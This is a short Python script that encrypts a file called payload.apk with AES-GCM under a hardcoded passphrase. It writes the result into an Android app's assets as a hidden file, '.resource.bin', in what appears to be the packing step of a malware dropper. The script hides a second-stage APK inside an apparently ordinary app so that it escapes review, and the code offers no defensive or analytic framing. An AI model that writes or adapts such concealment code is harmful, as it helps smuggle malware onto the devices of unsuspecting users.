from pathlib import Path
import hashlib
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PASSPHRASE = b"k7#Updater-9x!2026"
KEY = hashlib.sha256(PASSPHRASE).digest()

SRC = Path("payload.apk")
DST = Path("app/src/main/assets/media/.resource.bin")

blob = SRC.read_bytes()
iv = os.urandom(12)
out = iv + AESGCM(KEY).encrypt(iv, blob, None)

DST.parent.mkdir(parents=True, exist_ok=True)
DST.write_bytes(out)
print(f"embedded {len(out)} bytes into {DST}")